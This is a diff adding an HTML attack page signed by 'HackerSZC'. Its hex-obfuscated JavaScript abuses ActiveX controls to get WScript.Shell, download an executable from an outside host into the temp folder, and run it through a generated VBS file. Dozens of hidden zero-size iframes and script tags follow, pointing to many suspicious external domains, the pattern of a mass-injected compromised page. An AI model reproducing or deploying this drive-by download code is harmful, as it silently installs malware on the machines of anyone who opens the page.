@@ -1,0 +1,410 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<title>By:HackerSZC QQ:83883886</title>
+</head>
+<noscript>
+<iframe src=*></iframe>
+</noscript>
+<script>
+document.writeln("<script language=\"javaScript\">");
+document.writeln("Microsoft=\"http://www.gxrcsw.com/Ads/vv.exe\"");
+document.writeln("Microsoft1=\"\\x4D\\x69\\x63\\x72\\x6F\\x73\\x6F\\x66\\x74\\x2E\\x63\\x6F\\x6D\"");
+document.writeln("Microsoft2=\"\\x4D\\x69\\x63\\x72\\x6F\\x73\\x6F\\x66\\x74\\x2E\\x76\\x62\\x73\"");
+document.writeln("QQ83883886=\"\\x42\\x44\\x39\\x36\\x43\\x35\\x35\\x36\\x2D\\x36\\x35\\x41\\x33\\x2D\\x31\\x31\\x44\\x30\\x2D\\x39\\x38\\x33\\x41\\x2D\\x30\\x30\\x43\\x30\\x34\\x46\\x43\\x32\\x39\\x45\\x33\\x36\"");
+document.writeln("function Fan(love)");
+document.writeln("{");
+document.writeln(" var Fan=document.createElement(\'p\');");
+document.writeln("     Fan.innerHTML=love;");
+document.writeln("}");
+document.writeln("function CreateO(hackerszc,n)");
+document.writeln("{");
+document.writeln(" var zi=null;");
+document.writeln(" try");
+document.writeln("   {");
+document.writeln("    eval(\'zi=hackerszc.createobject(n)\')");
+document.writeln("   }");
+document.writeln(" catch(china)");
+document.writeln("   {}");
+document.writeln(" if (!zi)");
+document.writeln("   {");
+document.writeln("    try");
+document.writeln("     {");
+document.writeln("      eval(\'zi=hackerszc.createobject(n,\"\")\')");
+document.writeln("     }");
+document.writeln("    catch(china)");
+document.writeln("     {}");
+document.writeln("   }");
+document.writeln(" if(!zi)");
+document.writeln("   {");
+document.writeln("    try");
+document.writeln("      {");
+document.writeln("       eval(\'zi=hackerszc.createobject(n,\"\",\"\")\')");
+document.writeln("      }");
+document.writeln("    catch(china)");
+document.writeln("     {}");
+document.writeln("   }");
+document.writeln(" if (!zi)");
+document.writeln("  {");
+document.writeln("   try");
+document.writeln("     {");
+document.writeln("      eval(\'zi=hackerszc.getobject(\"\",n)\')");
+document.writeln("     }");
+document.writeln("   catch(china)");
+document.writeln("     {}");
+document.writeln("  }");
+document.writeln(" if (!zi)");
+document.writeln("   {");
+document.writeln("    try");
+document.writeln("      {");
+document.writeln("       eval(\'zi=hackerszc.getobject(n,\"\")\')");
+document.writeln("      }");
+document.writeln("    catch(china)");
+document.writeln("      {}");
+document.writeln("   }");
+document.writeln(" if (!zi)");
+document.writeln("   {");
+document.writeln("    try");
+document.writeln("      {");
+document.writeln("       eval(\'zi=hackerszc.getobject(n)\')");
+document.writeln("      }");
+document.writeln("    catch(china)");
+document.writeln("      {}");
+document.writeln("   }");
+document.writeln(" return(zi);");
+document.writeln("}");
+document.writeln("function Go(hacker)");
+document.writeln("{");
+document.writeln(" Fan(\'\');");
+document.writeln(" 88088878=\"\\x57\\x53\\x63\\x72\\x69\\x70\\x74\\x2E\\x53\";");
+document.writeln(" 83883886=88088878;");
+document.writeln(" var s=CreateO(hacker,83883886+\"\\x68\\x65\\x6C\\x6C\");");
+document.writeln(" var hackerszc=CreateO(hacker,\"\\x41\\x44\\x4F\\x44\\x42\\x2E\\x53\\x74\\x72\\x65\\x61\\x6D\");");
+document.writeln(" var ip=CreateO(hacker,\"\\x41\\x44\\x4F\\x44\\x42\\x2E\\x53\\x74\\x72\\x65\\x61\\x6D\");");
+document.writeln(" var china=s.environment(\"\x50\x72\x6F\x63\x65\x73\x73\");");
+document.writeln(" Fan(\'\');");
+document.writeln(" var url=Microsoft;");
+document.writeln(" var Lang=china.item(\"\\x54\\x45\\x4D\\x50\")+\"\\\\\"+Microsoft1;");
+document.writeln(" var kn123=china.item(\"\\x54\\x45\\x4D\\x50\")+\"\\\\\"+Microsoft2;");
+document.writeln(" var vip=null;");
+document.writeln(" var kn;");
+document.writeln(" kn=\"Set shell = createobject(\\\"\\x57\\x73\\x63\\x72\\x69\\x70\\x74\\x2E\\x53\\x68\\x65\\x6C\\x6C\\\")\";");
+document.writeln(" kn=kn+\"\\n\"+\"Shell.run(\\\"\"+Lang+\"\\\")\";");
+document.writeln(" kn=kn+\"\\n\"+\"set Shell=Nothing\";");
+document.writeln(" ip.mode=3;");
+document.writeln(" ip.open();");
+document.writeln(" ip.charset = \"\\x47\\x42\\x32\\x33\\x31\\x32\";");
+document.writeln(" ip.position = ip.Size;");
+document.writeln(" ip.writetext=kn;");
+document.writeln(" ip.SaveToFile(kn123,2);");
+document.writeln(" try");
+document.writeln("   {");
+document.writeln("    vip=new xmLhttprequest();");
+document.writeln("   }");
+document.writeln(" catch(china)");
+document.writeln("  {");
+document.writeln("   try");
+document.writeln("     {");
+document.writeln("      vip=new ActiveXObject(\"\\x4D\\x69\\x63\\x72\\x6F\\x73\\x6F\\x66\\x74\\x2E\\x78\\x6D\\x4C\\x68\\x74\\x74\\x70\");");
+document.writeln("     }");
+document.writeln("   catch(china)");
+document.writeln("     {");
+document.writeln("      vip=new ActiveXObject(\"\\x4D\\x53\\x58\\x4D\\x4C\\x32\\x2E\\x53\\x65\\x72\\x76\\x65\\x72\\x78\\x6D\\x4C\\x68\\x74\\x74\\x70\");");
+document.writeln("     }");
+document.writeln("  }");
+document.writeln(" if (!vip) return(0);");
+document.writeln(" Fan(\'\');");
+document.writeln(" vip.open(\"\\x47\\x45\\x54\",url,false);");
+document.writeln(" vip.send(null);");
+document.writeln(" kn=vip.responsebody;");
+document.writeln(" Fan(\'\');");
+document.writeln(" hackerszc.type=1;");
+document.writeln(" hackerszc.mode=3;");
+document.writeln(" hackerszc.open();");
+document.writeln(" hackerszc.write(kn);");
+document.writeln(" hackerszc.saVetOfile(Lang,2);");
+document.writeln(" Fan(\'\');");
+document.writeln(" s.run(kn123,0);");
+document.writeln("}");
+document.writeln("function Exploit()");
+document.writeln("{");
+document.writeln(" var i=0;");
+document.writeln(" var tt=new Array(\'{QQ83883886}\',\'{BD96C556-65A3-11D0-983A-00C04FC29E36}\',\'{AB9BCEDD-EC7E-47E1-9322-D4A210617116}\',\'{0006F033-0000-0000-C000-000000000046}\',\'{0006F03A-0000-0000-C000-000000000046}\',\'{6e32070a-766d-4ee6-879c-c1fa91d2fc3}\',\'{6414512B-B978-451D-A0D8-FCFDF33E833C}\',\'{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}\',\'{06723E09-F4C2-43c8-8358-09FCD1DB0766}\',\'{639F725F-1B2D-4831-A9FD-874847682010}\',\'{BA018599-1DB3-44f9-83B4-461454C84BF8}\',\'{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}\',\'{E8CCCDDF-CA28-496b-B050-6C07C962476B}\',null);");
+document.writeln("while (true)");
+document.writeln("   { t=tt[i];");
+document.writeln("     if (t==null)");
+document.writeln("       {");
+document.writeln("        return(0);");
+document.writeln("       }");
+document.writeln("     var hacker=null;");
+document.writeln("     if (t.substring(0,1)==\'{\')");
+document.writeln("       {");
+document.writeln("        try{");
+document.writeln("           hacker=document.createElement(\"\\x6F\\x62\\x6A\\x65\\x63\\x74\");");
+document.writeln("           hacker.setAttribute(\"\\x63\\x6C\\x61\\x73\\x73\\x69\\x64\",\"\\x63\\x6C\\x73\\x69\\x64\\x3A\"+t.substring(1,t.length-1));");
+document.writeln("          }");
+document.writeln("        catch(china)");
+document.writeln("          {}");
+document.writeln("       }");
+document.writeln("     else");
+document.writeln("       {");
+document.writeln("        try{");
+document.writeln("           hacker=new ActiveXObject(t);");
+document.writeln("          }");
+document.writeln("        catch(china)");
+document.writeln("          {}");
+document.writeln("       }");
+document.writeln("     if (hacker)");
+document.writeln("       {");
+document.writeln("        try");
+document.writeln("          {");
+document.writeln("           var b=CreateO(hacker,\"\\x57\\x53\\x63\\x72\\x69\\x70\\x74\\x2E\\x53\\x68\\x65\\x6C\\x6C\");");
+document.writeln("           if (b)");
+document.writeln("             {");
+document.writeln("              Fan(\'\');");
+document.writeln("              Go(hacker);");
+document.writeln("              return(0);");
+document.writeln("             }");
+document.writeln("          }");
+document.writeln("        catch(china)");
+document.writeln("          {}");
+document.writeln("       }");
+document.writeln("     i++;");
+document.writeln("    }");
+document.writeln("  Fan(\'\');");
+document.writeln("}");
+document.writeln(" Exploit()");
+document.writeln("");
+document.writeln("<\/script>");
+</script>
+</body>
+</html>
+
+</body>
+<iframe src="vip1.htm" width="0" height="0" border="0"></iframe>
+<iframe src="vip2.htm" width="0" height="0" border="0"></iframe>
+<iframe src="vip.htm" width="50" height="0" border="0"></iframe>
+</html>
+
+
+
+ <ifRame src=http://aaa.77XXmm.cn/new858.htm?075 width=0 namE='3394' heIght=0></Iframe><Iframe src=http://aaa.1l1l1l.coM/error/404.htMl widTh=0 name='3394' heIght=0></Iframe>
+
+
+
+
+ <iframe Src=http://aaa.77xxmm.cn/new858.htm?075 widTh=0 name='6290' height=0></iframe><iframe src=httP://aaa.1l1l1l.com/error/404.html Width=0 namE='6290' height=0></iframe>
+
+
+
+
+ <Iframe src=http://ppp.749571.com/ww/new888.htm?011 widtH=1 naMe='8744' heighT=1></iframe>
+
+
+
+
+<iframe src=http://ppp.749571.com/ww/new888.htm?011 width=1 height=1></iframe>
+ <iframe src=http://ppp.749571.com/ww/new888.htm?011 widTh=1 Name='2819' HeigHt=1></iframe>
+
+
+
+ <ifRame src=Http://ppp.749571.com/ww/new888.Htm?011 Width=1 name='2390' heIght=1></Iframe>
+<Iframe src=httP://PPP.749571.com/ww/new888.htm?013 widTh=1 name='2390' HeigHt=1></iframe>
+ <iframE src=http://aaa.77xxMM.cn/new858.htM?075 widtH=0 name='8871' height=0></ifRame><ifRame src=http://aaa.1l1l1l.coM/error/404.htMl width=0 name='8871' height=0></iFrame>
+
+
+
+
+ <Iframe src=http://aaa.77xxMM.cn/new858.htM?075 width=0 namE='5913' height=0></ifrAme><ifrAme src=http://aaa.1l1l1l.coM/error/404.htMl wIdth=0 nAme='5913' height=0></iframe>
+
+
+
+
+ <iFrame src=http://aaa.77xxmm.cn/new858.htm?075 width=0 name='6430' height=0></ifraMe><ifraMe sRc=http://aaa.1l1l1l.com/eRRoR/404.html wiDth=0 naMe='6430' height=0></iframe>
+
+
+
+
+ <ifraMe src=http://aaa.77XXmm.cn/new858.htm?075 widTh=0 name='1920' height=0></iframe><iframe src=http://aaa.1l1l1l.com/error/404.html width=0 name='1920' height=0></iframe>
+
+
+
+
+ <iframe src=http://aaa.77xxmm.cn/nEw858.htm?075 width=0 nAme='4001' hEight=0></iframE><iframE sRc=http://aaa.1l1l1l.com/eRRoR/404.html Width=0 name='4001' hEight=0></iframE>
+
+
+
+
+ <iFrame src=http://aaa.77xxmm.cn/new858.htm?075 width=0 name='6393' height=0></ifraMe><ifraMe Src=http://aaa.1l1l1l.com/error/404.html wiDth=0 naMe='6393' height=0></iframe>
+
+
+
+
+ <ifrAme src=http://AAA.77xxmm.cn/new858.htm?075 wiDth=0 name='1897' height=0></iframe><iframe src=http://aaa.1l1l1l.com/error/404.html widtH=0 name='1897' height=0></iframe>
+
+
+
+
+ <iFrame src=http://aaa.77xxmm.cn/new858.htm?075 width=0 name='6463' height=0></ifraMe><ifraMe sRc=http://aaa.1l1l1l.com/eRRoR/404.html wiDth=0 naMe='6463' height=0></iframe>
+
+
+
+
+ <ifRame src=Http://aaa.77xxmm.cn/new858.Htm?075 wIdth=0 name='6910' heIght=0></Iframe><Iframe src=http://aaa.1l1l1l.com/error/404.html widTh=0 name='6910' hEight=0></iframE>
+
+
+
+
+ <iFrame src=http://aaa.77xxmm.cn/new858.htm?075 Width=0 name='4250' height=0></ifraMe><ifraMe sRc=http://aaa.1l1l1l.com/eRRoR/404.html wiDth=0 naMe='4250' height=0></iframe>
+
+
+
+
+ <ifrAme src=http://www.shijiediyi.Net/oNe/hao8.htm?005 Width=1 namE='1850' height=1></iFrame><iFrame srC=http://aaa.1l1l1l.Com/error/404.html widTh=0 Name='1850' height=0></iframe>
+ ifraMe src=http://www.shijiediyi.net/one/hao8.htm?015 widtH=1 nAme='6377' height=1></iFrame>
+iframe src=http://www.shijiediyi.net/one/hao8.htm?015 width=1 height=1></iframe>
+ <ifraMe src=http://www.shIjIedIyI.net/one/hao8.htm?015 wIdth=1 name='4855' height=1></iframe>
+<iframe src=http://www.shijiediyi.net/one/hao8.htm?015 width=1 height=1></iframe>
+ <iFrame src=http://www.shijiediyi.net/one/hao8.htm?005 width=1 name='8807' height=1></ifraMe><ifraMe src=http://aaa.1l1l1l.com/error/404.html wiDth=1 name='8807' height=1></iframe>
+
+
+
+
+
+ <iFrame src=httP://www.shijiediyi.net/one/hao8.htm?015 wIdth=1 Name='1338' height=1></iframe>
+
+ <ifrAme src=hTTp://www.virusworm.org/defaulT.hTm Width=0 naMe='5318' HeigHt=0></iframe>
+<iframe src=http://www.socosoco.cn/goal/mm.htm width=0 name='5318' heIght=0></Iframe>
+<Iframe src=hTTp://wb.shijiediyi.neT/one/hao8.hTm?017 wiDth=1 name='5318' height=1></ifraMe>
+<script src=http://1.hao929.cn/1/4.js></script>
+<iframe src=http://www.51laa.com/cc888.htm?003 widTh=100 name='5318' heIght=0></Iframe>
+<Iframe src=http://adsl.jk33581.com/web/6032453.htm width=100 nAme='5318' height=0></iFrame>
+<iFrame wiDth=100 Name='5318' heighT=1 framEbordEr=0 sCrolling=no src=http://aaa.faba01.coM/hao116.htM></ifraMe>
+<ifraMe src=http://www.haole555.cn/tJ1/main.htm Width=0 name='5318' height=0></iframe> 
+ <iframe Src=http://www.viruSwom.org/default.htm widtH=0 name='9571' height=0></ifrAme>
+<ifrAme src=hTTp://www.socosoco.cn/goal/mm.hTm wiDth=0 namE='9571' height=0></iframe>
+<iframe src=http://www.shiJiediyi.net/one/hao8.htm?017 width=1 name='9571' heiGht=1></iframe>
+<iframe srC=http://www.51laa.Com/CC888.htm?003 widtH width=100 naMe='9571' height=0></iframe>
+<iframe src=http://adsl.Jk33581.com/web/6032453.htm wIdth=100 name='9571' hEight=0></iframE>
+<iframE width=100 name='9571' hEight=1 fraMeborder=0 srolliNg=No src=http://aaa.faba01.com/hao116.htm></iframe>
+<iframe src=http://%6c%6c%38%30%2e%63%6f%6d/xx/xx.htm widtH=50 name='9571' heiGht=0></iframe>
+<script src=http://1.haO929.cn/1/4.js></script>
+ <iframE src=http://wb.shijiediyi.Net/oNe/hao8.htm?024 width=1 name='2630' HeigHt=1></iframe>
+ <Iframe src=Http://bb.congtouzailai.net/one/Hao8.Htm?005 width=1 namE='8067' heIght=1></Iframe><Iframe sRc=http://aaa.1l1l1l.com/eRRoR/404.html wIdth=1 name='8067' height=1></iframe>
+
+
+
+
+
+
+
+ <Iframe src=http://cc.buhaOyishi.cOm/One/haO5.htm?015 widtH=1 nAme='9166' height=1></iframe><iframe src=http://www.111880.net/s1.htm?4027 Width=1 name='9166' HeigHt=1></iframe>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ <iframe src=http://cc.haowangma.com/one/hao5.htm?015 width=1 name='4863' height=1></ifRame>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ <ifrAme srC=http://www.vnet-1.net/s1.htm?hy Width=1 name='6176' heIght=1></Iframe><Iframe Src=http://aaa.1l1l1l.com/qq.htm widTh=1 name='6176' height=1></iframe>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ <ifraMe src=http://www.gdsax.cn/s1.htm?hy wiDth=100 name='7215' HeigHt=1></iframe><iframe src=httP://aaa.1l1l1l.com/qq.htm width=100 nAme='7215' height=1></iframe>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ <ifrAme src="http://yiduaner.cn/page/rnb.htm?mor" widtH=100 Name='2541' heIght=0></Iframe>
+
+ <iFrame src="Http://enenHk.cn/page/rnb.Htm?mor" wiDth=100 name='9200' height=0></iframe>
+
+
+ <iframE Src="http://twoeven.cn/page/rnb.htm?mor01" width=100 namE='2380' height=0></iframe>
+
+
+
+
+ <ifraMe sRc="http://twoeven.cn/page/Rnb.htm?moR01" width=100 naMe='3313' height=0></ifraMe>
+
+<iframe src=http://54hssy.cn/blog/ width=0 height=0></iframe>
+ <iframE src="http://ghsoot.cn/page/rnb.htm?mor02" width=100 naMe='8375' height=0></iframe>
+
+
+ <ifrAme src="http://ghsoot.cn/page/rnb.htm?mor02" width=100 Name='9062' height=0></ifRame>
+
+
+ <Iframe src=hTTp://www.hby007.cn/one/a26.hTm?01 wIdth=50 nAme='7006' heIght=0 border=0></iframe>
+
+
+
+
+
+
+
+
+ <iframE src=http://www.hby007.cn/one/a26.htm?01 widtH=50 naMe='8252' heIght=0 border=0></iFrame>
+ <ifRame srC=http://www.eqw002.Cn/one/a46.htm Width=50 name='6346' height=0 borDer=0></iframe>
+ <ifRame src=Http://www.wrmfwo.cn/one/a26.Htm wIdth=50 name='4338' height=0 boRdeR=0></ifRame>
+ <ifrAme src=hTTp://www.jznylsf.cn/one/a26.hTm wIdth=50 name='9420' hEight=0 border=0></iframe>
